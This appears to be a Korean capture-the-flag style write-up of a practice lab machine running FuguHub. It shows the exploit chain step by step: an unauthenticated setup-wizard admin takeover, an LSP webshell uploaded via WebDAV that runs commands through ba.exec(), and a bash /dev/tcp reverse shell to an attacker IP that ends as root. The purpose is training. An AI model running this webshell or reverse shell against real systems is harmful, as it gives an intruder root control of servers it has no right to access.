---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/lin/passwd-write
  - tech/web/webdav
  - tech/web/default-creds
  - tech/enum/dirbust
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.25
domain: hub.local
ports: [22, 80, 8082, 9999]
services: [http, ssh, ssl/abyss]
cves: [CVE-2023-24078, CVE-2024-27697]
status: solved
tech_count: 5
---
> [!info] PG Practice — Pentester Foundations #2
> **타겟** 192.168.248.25 · **OS** Debian 11 · **난이도** Fundamental · **플래그 1개**
> **경로 요약** 8082 FuguHub 8.4 설정마법사 미완료 → 비인증 관리자 계정 선점 → WebDAV로 `.lsp` 업로드 → `ba.exec()` → **곧바로 root**

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.25
Nmap scan report for 192.168.248.25
Host is up (0.093s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http       Barracuda Embedded Web Server
| http-methods:
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-server-header: BarracudaServer.com (Posix)
|_http-title: Home
| http-webdav-scan:
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPPATCH, LOCK, UNLOCK
|   Server Type: BarracudaServer.com (Posix)
|_  WebDAV type: Unknown
9999/tcp open  ssl/abyss?
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
OS details: Linux 5.0 - 5.14
Nmap done at Wed Aug 19 17:09:20 2026 -- 1 IP address (1 host up) scanned in 165.88 seconds
```

읽는 법:

- **8082 = FuguHub 본체.** `Server: BarracudaServer.com` 배너와 SSL 인증서 CN `FuguHub`가 제품을 확정한다.
- **9999 = 같은 앱의 HTTPS 리스너.** nmap이 `ssl/abyss?`로 오인했지만 `curl -k https://T:9999/`가 8082와 동일한 Home을 반환한다. `bdd.conf`의 `port=8082 / sslport=9999`가 확증.
- **`http-methods`에 `PUT`/`MKCOL`/`MOVE`** — WebDAV가 살아 있다는 신호. 업로드 RCE를 즉시 의심할 근거다.
- 80은 nginx 403이지만 **버리면 안 된다**(아래 참조).

### 버전 판정 — 이 박스 최대의 함정

> [!danger] `readme.txt`를 믿으면 틀린다
> 80/tcp nginx가 FuguHub 설치 디렉터리(`/var/www/html`)를 그대로 서빙해서 `readme.txt`를 읽을 수 있다. 그 선두는 이렇게 시작한다:
>
> ```
>  Changes for 8.0     July 2019
> ```
>
> SSL 인증서 `Not valid before: 2019-07-16`, 8082 인덱스 `Last-Modified: 2019-07-19`까지 **3중으로 "2019년 8.0"을 가리킨다.**
> **전부 오답이다.** 실행 중인 제품은 **8.4**다. 배포본에 딸려온 changelog가 갱신되지 않았을 뿐이다.

인증 후 `/rtl/about.lsp`가 앱 스스로 렌더한 값이 최종 근거다:

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password http://192.168.248.25:8082/rtl/about.lsp | grep -i fuguhub
<h2>FuguHub 8.4</h2>
<p>FuguHub is free to use for non-commercial or educational use...
```

> [!tip] 버전 증거의 신뢰 순위
> 1. **앱이 런타임에 렌더하는 About/버전 페이지** ← 최상위
> 2. 서버 헤더 / API가 반환하는 버전 필드 ([[Crane]]의 `get_server_info`가 이 예)
> 3. 패키지 메타데이터 (`composer.json` 등)
> 4. **정적 파일의 changelog·readme** ← 최하위. **갱신 안 된 잔존물일 수 있다.**
>
> 리소스 해시(favicon, 로고)도 무용지물이었다 — 8.0과 8.4가 바이트 동일이라 구분이 안 된다.

랩 브리핑은 이 박스를 **8.1 / CVE-2023-24078**이라고 안내하는데 실제 버전은 8.4다. 다만 **악용 메커니즘은 동일**하다 — `/Config-Wizard/wizard/SetAdmin.lsp` 무인증 노출 → 관리자 선점 → WebDAV `.lsp` 업로드 → RCE. 이 체인은 8.1의 CVE-2023-24078(EDB 51550)과 8.4의 CVE-2024-27697이 공유하는 결함이다. **CVE 번호를 맞히는 것보다 메커니즘을 아는 것이 실전에서 중요하다.**

### 무인증 접근 표면

| 경로 | 코드 | 비고 |
|---|---|---|
| `/` | 200 | "Configuration Wizard must be completed" 배너 |
| **`/Config-Wizard/`** | 302 → `SetAdmin.lsp` | **무인증** |
| **`/Config-Wizard/wizard/SetAdmin.lsp`** | 200 | **무인증 — 진입점** |
| `/rtl/about.lsp` | 200 | 버전 확인 |
| `/blog/`, `/photos.html`, `/Contact-Us.html` | 200 | CMS 공개 페이지 |
| `/rtl/protected/*` | 401 | realm `FuguHub` |
| `/fs/` | 401 | realm `Web File Server` (WebDAV) |
| `/private/`, `/private/manage/` | 401 | realm `Content Management System` |

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -i -X OPTIONS http://192.168.248.25:8082/
HTTP/1.1 200 OK
Server: BarracudaServer.com (Posix)
Allow: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
DAV: 1, 2
MS-Author-Via: DAV
```

### 80/tcp — 403이라고 넘기면 안 되는 이유

루트 인덱스는 403이지만 **문서 루트가 `/var/www/html`, 즉 FuguHub 설치 디렉터리 그 자체**다. 파일명을 직접 때리면 읽힌다.

```
/readme.txt                      200  18730   ← (함정) 8.0 changelog
/LICENSE.txt                     200  87
/user.dat                        200  467     ← FuguHub 사용자 DB
/bdd.conf                        200  56      ← 포트 설정
/applications/Config-Wizard.zip  200  71872
/applications/ /data/ /disk/ /themes/ /cache/ /trace/   403 (autoindex 꺼짐)
```

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s http://192.168.248.25/bdd.conf
drivedir="/var/www/html/cmsdocs"
port=8082
sslport=9999
```

`user.dat`은 FuguHub 자체 암호화 포맷이라 평문 해시가 아니다(크랙 불가). 그래도 **설치 경로 확정**과 **셸 획득 후 드롭한 파일을 80으로 회수**하는 용도로 쓸 수 있다.

> [!tip] `403 Forbidden`은 "볼 것 없음"이 아니다
> 디렉터리 인덱싱만 꺼져 있고 **파일 자체는 서빙되는** 경우가 흔하다. 파일명 워드리스트로 다시 긁어야 한다.
> 여기서는 `-x txt,conf,dat,zip` 계열 확장자가 결정적이었다.

### feroxbuster — 9999는 통째로 위양성

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ feroxbuster -u http://192.168.248.25:8082/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,lsp -t 100 -o ferox_8082.log
200      GET      147l      606w     6924c http://192.168.248.25:8082/
200      GET       67l      449w     4973c http://192.168.248.25:8082/Contact-Us.html
401      GET        1l        2w       21c http://192.168.248.25:8082/rtl/protected/admin/
401      GET        1l        2w       21c http://192.168.248.25:8082/rtl/protected/wfslinks.lsp
```

> [!warning] BarracudaServer는 존재하지 않는 경로에도 302를 준다
> 9999 스캔에서 `/2009`, `/App_Data`, `/fileadmin`, `/downloader`, `/openx` 등 302가 50건 넘게 나왔는데 **전부 가짜**다.
> 확인법 — 아무 문자열이나 던져본다:
>
> ```bash
> └─$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:9999/nonexistent-abc123
> 302
> ```
>
> **스캔 시작 전에 존재할 리 없는 경로를 한 번 때려서 서버의 "없음" 응답이 뭔지 확정**하고 그 코드를 필터(`-C 302`)하는 습관을 들일 것.

### Step 1 — 관리자 계정 선점

`/Config-Wizard/wizard/SetAdmin.lsp`는 인증이 없다. 자기 자신에게 POST해서 관리자 계정을 만든다.

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -i -X POST 'http://192.168.248.25:8082/Config-Wizard/wizard/SetAdmin.lsp' \
     -d 'email=admin@hub.local&user=admin&password=password'
HTTP/1.1 200 OK
...
Administrator Account Saved
```

**자격증명 확보: `admin` / `password`** (HTTP Basic)

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:8082/rtl/protected/
401
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -o /dev/null -w "%{http_code}\n" -u admin:password http://192.168.248.25:8082/rtl/protected/
200
```

> [!warning] 이 공격은 **한 번만** 쓸 수 있다
> 계정을 만들고 나면 같은 페이지가 이렇게 바뀐다:
>
> ```
> <h1>User database already saved</h1>
> <li>Delete the user database file:<br/>"/var/www/html/user.dat"</li>
> ```
>
> 다시 쓰려면 `/var/www/html/user.dat`를 지워야 한다(= 이미 셸이 필요). **누가 먼저 선점하면 끝**이므로 실전이라면 이 표면을 발견한 즉시 잡아야 한다.

### Step 2 — `.lsp` 업로드로 코드 실행

Web-File-Server(`/fs/`)는 WebDAV 파일 매니저이고 **공유 루트가 웹 루트와 같다.** `PUT /fs/x.lsp` → `GET /x.lsp` 하면 LSP(Lua Server Pages)로 실행된다.

RCE 시도 전에 **서버측 실행 자체가 되는지 산술식으로 먼저 확인한다**:

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ printf '%s' '<?lsp response:write("PWNTEST=" .. tostring(7*7)) ?>' > /tmp/t1.lsp

┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password -T /tmp/t1.lsp http://192.168.248.25:8082/fs/t1.lsp
HTTP/1.1 201 Created

┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password http://192.168.248.25:8082/t1.lsp
PWNTEST=49
```

### Step 3 — `io.popen` 차단 → `ba.exec()`

교과서적 Lua 웹셸은 `io.popen`을 쓰는데 FuguHub의 LSP 샌드박스는 이걸 제거해놨다:

```
field 'popen' is not callable
```

대신 **Barracuda 런타임이 노출하는 `ba.exec()`** 가 살아 있고 stdout을 캡처해 돌려준다. `pcall`로 감싸 **에러까지 응답에 찍게** 만든 것이 핵심이다 — 뭐가 왜 막혔는지 보여야 다음 수를 고른다.

```lua
<?lsp
local c = request:data("c") or "id"
local ok,a,b,cc = pcall(function() return ba.exec(c) end)
response:write("ba.exec ok="..tostring(ok).." => "..tostring(a).." | "..tostring(b).." | "..tostring(cc).."\n")
?>
```

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password -T /tmp/x.lsp http://192.168.248.25:8082/fs/x.lsp
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password --data-urlencode 'c=id' http://192.168.248.25:8082/x.lsp
ba.exec ok=true => uid=0(root) gid=0(root) groups=0(root)
```

**이미 uid=0이다.** FuguHub가 root로 뜨기 때문이다:

```bash
root@debian:/var/www/html# cat /etc/systemd/system/fuguhub.service
[Unit]
Description=FuguHub Service
After=network.target

[Service]
ExecStart=/var/www/html/FuguHub
WorkingDirectory=/var/www/html
User=root
Group=root
Restart=always
```

`User=root` — **권한상승 단계가 아예 없는 박스**다.

### Step 4 — 인터랙티브 root 셸

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ tmux new-session -d -s hub 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password --data-urlencode \
    'c=setsid bash -c "bash -i >& /dev/tcp/192.168.45.207/4444 0>&1" &' \
    http://192.168.248.25:8082/x.lsp
```

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.25] 46868
root@debian:/var/www/html# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@debian:/var/www/html# id; hostname; cat /root/proof.txt
uid=0(root) gid=0(root) groups=0(root)
debian
702262325fd3a55a2f23d49e0256571c
```

`setsid ... &`로 띄우는 이유는 웹 요청이 셸 프로세스를 물고 늘어져 HTTP 응답이 안 돌아오는 것을 피하기 위해서다. ([[Crane]]에서 겪은 "익스가 멈춘 것처럼 보이는" 현상의 예방책)

### 플래그 / 수집물

```bash
root@debian:/var/www/html# find / -name local.txt 2>/dev/null
       (없음)
root@debian:/var/www/html# ls /root/
email4.txt  proof.txt
root@debian:/var/www/html# cat /root/email4.txt
MENURkBvZmZzZWMuY29t          # base64 → 0CTF@offsec.com  (미끼)
root@debian:/var/www/html# grep -vE 'nologin|false' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
offsec:x:1000:1000:,,,:/home/offsec:/bin/bash
```

| | |
|---|---|
| `proof.txt` | `702262325fd3a55a2f23d49e0256571c` |
| `local.txt` | **존재하지 않음** — 이 박스는 플래그 1개 |

`/home/offsec`은 비어 있다. 포털 진행도가 `0/1`이면 user 플래그는 없다 — `find`로 교차 확인하고 넘어간다.

## OSCP 관점 정리

1. **버전 증거에는 신뢰 순위가 있다.** 앱이 렌더하는 About 페이지 > 서버/API 버전 필드 > 패키지 메타데이터 > **정적 changelog·readme**. 이 박스는 `readme.txt`(8.0) + SSL 인증서 날짜 + `Last-Modified`가 **3중으로 일치하며 틀렸다.** 증거가 여러 개 일치해도 **출처가 같으면(2019년 배포본 잔존물) 독립 증거가 아니다.**
2. **"설정 마법사 미완료" 배너 = 즉시 공격 대상.** 초기 설정이 안 끝난 어플라이언스는 관리자 계정을 공격자가 선점할 수 있다. FuguHub·NAS·공유기 관리페이지에서 반복되는 패턴이며 **선착순이라 발견 즉시 잡아야 한다.**
3. **`403 Forbidden`은 "볼 것 없음"이 아니다.** 인덱싱만 꺼졌을 뿐 파일은 서빙된다. 여기서는 80이 설치 디렉터리를 그대로 노출했다.
4. **스캐너 위양성을 먼저 걸러라.** 존재할 리 없는 경로를 한 번 때려 서버의 "없음" 응답 코드를 확정하고 필터한다. 9999 결과 50여 건이 통째로 가짜였다.
5. **업로드 RCE는 2단계로 검증.** ① 무해한 산술식으로 서버측 실행 확인 ② 명령 실행. 한 번에 리버스셸부터 던지면 실패 지점을 모른다.
6. **샌드박스는 벽이 아니다.** `io.popen` 차단 → `ba.exec()`. `pcall`로 에러를 응답에 노출시켜 살아 있는 API를 관측한다.
7. **`User=root`로 도는 서비스는 그 자체가 privesc.** 셸 잡자마자 `id`부터. 이미 root면 그 뒤 열거는 전부 낭비다.

## 남긴 흔적 (랩 정리용)

`/var/www/html/`에 `t1.lsp`, `en.lsp`, `sh9.lsp`, `x.lsp` 업로드됨. 관리자 계정 `admin:password` 및 `/var/www/html/user.dat` 생성됨. 랩 Stop/Revert 시 전부 소멸.

## 관련 노트

- [[01. Pentest Foundations]] — Hub 항목
- [[Crane]] — 직전 박스, 같은 컬렉션
